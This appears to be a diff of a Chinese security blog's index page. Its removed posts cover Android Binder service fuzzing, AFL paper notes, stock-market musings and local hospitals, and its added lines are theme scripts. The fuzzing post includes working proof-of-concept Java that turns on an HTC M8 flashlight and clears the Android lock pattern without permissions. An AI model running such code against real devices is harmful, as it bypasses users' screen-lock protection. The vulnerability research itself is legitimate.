class="line">            <span class="type">String</span> <span class="variable">func_name</span> <span class="operator">=</span> method.toString().split(<span class="string">&quot;\\$Stub\\$Proxy\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            func_parameter.add(func_name);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (String key : codes.keySet()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (func_name.contains(key.substring(<span class="string">&quot;TRANSACTION_&quot;</span>.length())))</span><br><span class="line">                    func_code = codes.get(key);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (func_code == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt;[] ParameterTypes = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k &lt; ParameterTypes.length; k++) &#123;</span><br><span class="line">                func_parameter.add(ParameterTypes[k].toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ret.put(Integer.toString(func_code), func_parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="5）Binder-调用"><a href="#5）Binder-调用" class="headerlink" title="5）Binder 调用"></a>5）Binder 调用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fuzz</span> <span class="params">(<span class="type">int</span> code, String Service)</span> &#123;</span><br><span class="line">    <span class="type">Parcel</span> <span class="variable">data</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">    <span class="type">Parcel</span> <span class="variable">reply</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> BinderInfo.getIBinder(service);</span><br><span class="line">    serviceBinder.transact(code, data, reply, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面的几个步骤已经全部java 代码实现，可行。</p>
-<h2 id="5-实现方法的分析于比较"><a href="#5-实现方法的分析于比较" class="headerlink" title="5. 实现方法的分析于比较"></a>5. 实现方法的分析于比较</h2><p>ioctl 的方法过于底层，需要实现的代码很多，而 java 应用层的代码由于权限原因，经常会遇到没有权限的情况。<br>所以使用 Native 层的方法是合适的，在Root 的Android 机器上运行代码，可以解决权限问题。而 Java 应用层的<br>代码利用反射可以获取到每个接口的详细信息，根据获取到的信息指导 Native 层 fuzz 程序的后续变异，应该是比较理想的方法。</p>
-<h2 id="6-Fuzz-数据的生成"><a href="#6-Fuzz-数据的生成" class="headerlink" title="6. Fuzz 数据的生成"></a>6. Fuzz 数据的生成</h2><p>可以考虑移植 radasma 到 Android 平台</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/anestisb/radamsa-android.git</span><br><span class="line">$ cd radamsa-android</span><br><span class="line">$ export PATH=$PATH:NDK_PATH</span><br><span class="line">$ ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./jni/Android.mk \</span><br><span class="line">    APP_PLATFORM=android-24 APP_ABI=armeabi-v7a \</span><br><span class="line">    NDK_TOOLCHAIN=arm-linux-androideabi-4.9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[armeabi-v7a] Compile thumb  : radamsa &lt;= radamsa.c</span><br><span class="line">[armeabi-v7a] Executable     : radamsa</span><br><span class="line">[armeabi-v7a] Install        : radamsa =&gt; libs/armeabi-v7a/radamsa</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-1-更新-radamsa-android"><a href="#6-1-更新-radamsa-android" class="headerlink" title="6.1 更新 radamsa-android"></a>6.1 更新 radamsa-android</h3><p>github 上移植的radamsa 已经比较古老 (0.4), 可以直接将最新版(0.6a)的radamsa 移植<br>到 Android上。方法比较简单，在原始的 radamsa 中有一个 radamsa.c 将这个文件替换<br>radamsa-android&#x2F;jni 目录下的 radamsa.c</p>
-<p>然后在文件中添加下面代码， 重新编译即可：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ANDROID</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> WIFCONTINUED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFCONTINUED(stat) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
-
-<h2 id="7-Fuzz-出来的一些漏洞"><a href="#7-Fuzz-出来的一些漏洞" class="headerlink" title="7. Fuzz 出来的一些漏洞"></a>7. Fuzz 出来的一些漏洞</h2><h3 id="1）-htc-m8-零权限打开闪光灯"><a href="#1）-htc-m8-零权限打开闪光灯" class="headerlink" title="1） htc m8 零权限打开闪光灯"></a>1） htc m8 零权限打开闪光灯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> getIBinder(<span class="string">&quot;media.camera&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Parcel</span> <span class="variable">data1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"><span class="type">Parcel</span> <span class="variable">reply1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">    data1.writeByteArray(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>]);</span><br><span class="line">    serviceBinder.transact(<span class="number">8</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> getIBinder(<span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">data1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">reply1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">		data1.writeByteArray(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">255</span>]);</span><br><span class="line">		serviceBinder.transact(<span class="number">7</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (RemoteException e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">				.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p>
-<p>这个问题已经修复 author Jim Miller <a href="mailto:&#106;&#97;&#103;&#x67;&#105;&#x65;&#x73;&#x40;&#x67;&#111;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#x6f;&#109;">&#106;&#97;&#103;&#x67;&#105;&#x65;&#x73;&#x40;&#x67;&#111;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#x6f;&#109;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
-<p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p>
-<p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-15/materials/us-15-Gong-Fuzzing-Android-System-Services-By-Binder-Call-To-Escalate-Privilege.pdf">Fuzzing Android System Services by Binder Call to Escalate Privilege</a></li>
-<li><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2016/12/bitunmap-attacking-android-ashmem.html">BitUnmap: Attacking Android Ashmem</a></li>
-<li><a target="_blank" rel="noopener" href="http://newandroidbook.com/files/Andevcon-Binder.pdf">Android’s Binder – in depth</a></li>
-</ul>
-
+<meta name="twitter:image" content="http://usmacd.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://usmacd.com/page/6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '安全代码',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-11-06 14:11:14'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
+        get: key => {
+          const itemStr = localStorage.getItem(key)
       
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/afl/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/afl/" class="post-title-link" itemprop="url">afl-fuzz 框架</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/afl-fuzz.png" alt="afl-fuzz"></p>
-
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
       
-    </div>
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-    
-    
-    
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-    <footer class="post-footer">
-        <div class="post-eof"></div>
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
       
-    </footer>
-  </article>
-</div>
-
-
-
-
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/afl-fuzz1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/afl-fuzz1/" class="post-title-link" itemprop="url">Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>paper: <a target="_blank" rel="noopener" href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p>
-<h2 id="两个实验的结论-主要基于-FuzzBench"><a href="#两个实验的结论-主要基于-FuzzBench" class="headerlink" title="两个实验的结论 (主要基于 FuzzBench)"></a>两个实验的结论 (主要基于 FuzzBench)</h2><ul>
-<li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li>
-<li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate – in isolation – the benefit of a different mechanism to decide if an input is interesting, as AFL’s novelty search provides a strong baseline.</li>
-</ul>
-<h2 id="论文中计划要评估的-afl-fuzz-的一些技术"><a href="#论文中计划要评估的-afl-fuzz-的一些技术" class="headerlink" title="论文中计划要评估的 afl-fuzz 的一些技术"></a>论文中计划要评估的 afl-fuzz 的一些技术</h2><ul>
-<li><strong>Hitcounts</strong>: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li>
-<li><strong>Novelty search vs. maximization of a fitness</strong>: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul>
-<li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li>
-<li>We expect the novelty search to outperforms both of the competing algorithms,</li>
-</ul>
-</li>
-<li><strong>Corpus culling</strong>: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul>
-<li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li>
-<li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li>
-</ul>
-</li>
-<li><strong>Score calculation</strong>: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul>
-<li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li>
-</ul>
-</li>
-<li><strong>Corpus scheduling</strong>: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase<ul>
-<li>Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li>
-</ul>
-</li>
-<li><strong>Splicing as stage vs. splicing as mutation</strong>: Splicing refers to the operation that merges two different testcases into a new one<ul>
-<li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li>
-</ul>
-</li>
-<li><strong>Trimming</strong>: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul>
-<li>Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li>
-<li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li>
-</ul>
-</li>
-<li><strong>Collisions</strong>: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul>
-<li>We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/a_change/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/a_change/" class="post-title-link" itemprop="url">关于A股变盘的假期效应思考</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>沉浮 A股多年，发现一个比较重要的规律，A 股变盘的时间节点大多发生在重大节假日期间，分别举例如下：</p>
-<ul>
-<li>「1」重大节日 （包括阳历和农历： 劳动节，国庆节，中秋节，端午节，过年 等）</li>
-<li>「2」周一&#x2F;周五</li>
-<li>「3」月初&#x2F;月末</li>
-</ul>
-<p>有人总结出 A 股变盘时间节点和农历的 24 节气相关，每个节气的时间间隔大致在 15 到 16 天左右，这条规律<br>其实和上面的 「1」 说法是一致的。</p>
-<p>思考其背后的原因，平时交易日都是连续的中间无间断，大家的交易思路和看法也比较容易连续一致。<br>每逢重大节日，或者月初月末，往往都是放假休息的时间，外加期间各种信息的输入量比平时大很多，这样容易有思维波动。重大节日后，主力一带节奏，容易对大家的思维进行强化，分歧转一致后，就真的变盘了。</p>
-<p>A股还有个月初，月末效应，月初赚钱，月末亏钱，比较奇怪，可能和基金经理的月初建仓和月末考核相关，这条规律几乎是对称的，如果月末没有大跌，月初基本就没有大赚效应。</p>
-<p>后面发现居然有一个股票技术分析流派叫季节派。（季节理论 Season Theory）</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/304/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/304/" class="post-title-link" itemprop="url">紫竹桥附近看病情况</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>作为一个长期在帝都紫竹桥混吃的中年大叔，经常遇到需要看病的情况，主要需求有两个 （大人看病，小孩看病）。</p>
-<p>总结附近医院情况，个人理解，供参考：</p>
-<p>466:</p>
-<p>缺点：没有儿科，巨贵，感觉医生喜欢过度治疗，据说一些科室已被私人承包，媳妇和自己都被坑过。<br>优点：离紫竹桥距离近，三甲，人通常比较少，小病，偷懒的时候可以过去。据说牙科不错，但是我没有去过。</p>
-<p>304:</p>
-<p>缺点：信息化程度相对较弱，但是看病流程梳理得不错。<br>优点：三甲，有儿科，对小儿看病有一定优待。医生水平不错，小孩在这看过几次，治疗效果不错。</p>
-<p>现在304 改名为 解放军总医院第四医学中心，儿科的实力比以往有较大提升。</p>
-<p>四季青：</p>
-<p>缺点：二级医院，儿科有的医生感觉不太专业。<br>优点：挂号方便，有儿科，医院较大。</p>
-<p>北方医院：</p>
-<p>缺点：二级医院， 医院较小。<br>优点：离紫竹桥距离近，有保健科，小孩打预防针不错。</p>
-<p>空总：</p>
-<p>在这个医院多个科室看过病，家人还在这做过微创手术。</p>
-<p>缺点：挂号有点难，人多，儿科水平一般。<br>优点：三甲，皮肤科北京有名，各科室水平比较均衡。信息化程度高，看病挺方便。</p>
-<p>海总：</p>
-<p>这个医院我没有去过，距离稍远。</p>
-
-      
-    </div>
-
